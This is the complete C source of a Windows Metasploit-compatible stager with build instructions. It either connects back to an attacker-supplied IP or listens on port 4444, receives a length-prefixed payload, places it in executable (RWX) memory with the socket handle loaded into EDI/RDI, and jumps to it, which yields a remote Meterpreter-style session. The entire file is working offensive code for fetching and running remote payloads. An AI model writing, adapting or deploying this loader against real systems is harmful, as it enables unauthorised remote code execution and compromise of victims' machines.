/*
 * A C-based stager client compat with the Metasploit Framework
 *    based on a discussion on the Metasploit Framework mailing list
 *    and the version made by Raphael Mudge (https://github.com/rsmudge/metasploit-loader/)
 * 
 * This version allows you to choose between BIND TCP (default) and REVERSE TCP payload
 * for both 32bit and 64bit architecture. 
 *
 * Compilation:
 *	MinGW 32bit: gcc met-loader.c -o met-loader -lws2_32 -static -L c:\path_to_mingw\lib
 *   	MinGW 64bit: gcc -m64 met-loader.c -o met-loader -lws2_32 -static
 *
 * @author 0-duke
 * @license BSD License.
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <getopt.h>

/* init winsock */
VOID winsock_init() {
	WSADATA	wsaData;
	WORD wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		fprintf(stderr, "[!] Something is wrong with ws2_32.dll.\n");
		WSACleanup();
		exit(1);
	}
}

/* a quick routine to quit and report why we quit */
VOID perr(SOCKET s, CHAR * error) {
	fprintf(stderr, "[!] Error: %s\n", error);
	closesocket(s);
	WSACleanup();
	exit(1);
}

/* attempt to receive all of the requested data from the socket */
UINT32 recv_all(SOCKET s, VOID *buffer, UINT32 len) {
	UINT32    tret   = 0;
	UINT32    nret   = 0;
	VOID *startb = buffer;
	while (tret < len) {
		nret = recv(s, (CHAR *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			perr(s, "Could not receive data");
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET reverse_tcp_connect(CHAR * target_ip, UINT32 port) {
	struct hostent *target;
	struct sockaddr_in 	sa_i_reverse;
	SOCKET 	reverse_socket;

	/* setup our socket */
	reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (reverse_socket == INVALID_SOCKET)
		perr(reverse_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(target_ip);
	if (target == NULL)
		perr(reverse_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sa_i_reverse.sin_addr.s_addr, target->h_addr, target->h_length);
	sa_i_reverse.sin_family = AF_INET;
	sa_i_reverse.sin_port = htons(port);

	/* attempt to connect */
	if ( connect(reverse_socket, (struct sockaddr *)&sa_i_reverse, sizeof(sa_i_reverse)) )
		perr(reverse_socket, "Could not connect to target");

	return reverse_socket;
}

/* listen for a connection to port */
SOCKET bind_tcp_listen(UINT32 port) {
	struct sockaddr_in 	sa_i_listen, sa_i_new;
	SOCKET 	listen_socket, new_socket;
	UINT32 c;

	/* setup our socket */
	listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET)
		perr(listen_socket, "Could not initialize socket");

	//Prepare the sockaddr_in structure
    sa_i_listen.sin_family = AF_INET;
    sa_i_listen.sin_addr.s_addr = INADDR_ANY;
    sa_i_listen.sin_port = htons(port);
     
    /* Bind on port specified */
    if( bind(listen_socket, (struct sockaddr *)&sa_i_listen , sizeof(sa_i_listen)) == SOCKET_ERROR)
    {
        perr(listen_socket, "Bind function failed.\n");
    }
    
    listen(listen_socket, 3);

    c = sizeof(struct sockaddr_in);
    new_socket = accept(listen_socket , (struct sockaddr *)&sa_i_new, &c);
    if (new_socket == INVALID_SOCKET)
    {
        perr(listen_socket, "Accept function failed.\n");
    }

	return new_socket;
}

UINT32 main(UINT32 argc, CHAR *argv[]) {
	ULONG32 payload_size;
	CHAR *payload_buffer;
	UINT32 port = 4444; //Default port to use
	CHAR *reverse_ip_address = NULL;
	VOID (*function)();

    INT32 opt;
    enum { REVERSE_TCP, BIND_TCP } mode = BIND_TCP;

    while ((opt = getopt(argc, argv, "r:p:")) != -1) {
        switch (opt) {
	        case 'p':
	        	port = atoi(optarg);
	        	break;
	        case 'r':
	        	reverse_ip_address = optarg; 
	        	mode = REVERSE_TCP; 
	        	break;
	        case 'h':
	        default:
	            fprintf(stderr, "Usage: %s [-r ip_reverse_connect] [-p port]\n", argv[0]);
	            fprintf(stderr, "%s\t\t\t\t: BIND TCP on default port 4444\n", argv[0]);
	            fprintf(stderr, "%s -p 12345\t\t\t: BIND TCP on port 12345\n", argv[0]);
	            fprintf(stderr, "%s -r 192.168.1.1\t\t: REVERSE TCP connect to 192.168.1.1 on default port 4444\n", argv[0]);
	            fprintf(stderr, "%s -r 192.168.1.1 -p 12345\t: REVERSE TCP connect to 192.168.1.1 on port 12345\n", argv[0]);
	            exit(EXIT_FAILURE);
        }
    }

	winsock_init();

	/* Set reverse tcp or bind tcp based on arguments */
	SOCKET s = 0;
	if (mode == REVERSE_TCP) s = reverse_tcp_connect(reverse_ip_address, port);
	else s = bind_tcp_listen(port);

	/* read the first 4-byte length with the size of the payload */
	INT32 count = recv(s, (char *)&payload_size, 4, 0);
	if (count != 4 || payload_size <= 0)
		perr(s, "4 Bytes expected but different length received.\n");

	/* allocate a RWX payload_buffer to containt the payload */
	/* and add a little a little more space to inject opcodes to move */
	/* socket to EDI register as pointed out in emails thread */
	/* http://mail.metasploit.com/pipermail/framework/2012-September/008660.html */
	/* http://mail.metasploit.com/pipermail/framework/2012-September/008664.html */
	#if __x86_64__
		/* For 64 bit payload we need 10 bytes */
		/* 48 BF 78 56 34 12 00 00 00 00  =>   mov rdi, 0x12345678 */ 
		payload_buffer = VirtualAlloc(0, payload_size + 10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (payload_buffer == NULL) perr(s, "Could not allocate buffer\n");
	 	payload_buffer[0] = 0x48;
 		payload_buffer[1] = 0xBF;
 		memcpy(payload_buffer + 2, &s, 8);
 		/* read bytes into the payload_buffer */
		count = recv_all(s, payload_buffer + 10, payload_size);
	#else
		/*  For 32 bit payload we need 5 bytes */
		/*  BF 78 56 34 12     =>      mov edi, 0x12345678 */
 		payload_buffer = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (payload_buffer == NULL) perr(s, "Could not allocate buffer\n");
		payload_buffer[0] = 0xBF;
		memcpy(payload_buffer + 1, &s, 4);
		/* read bytes into the buffer */
		count = recv_all(s, payload_buffer + 5, payload_size);
	#endif 

	/* cast our payload_buffer as a function and call it */
	function = (void (*)())payload_buffer;
	function();

	return 0;
}

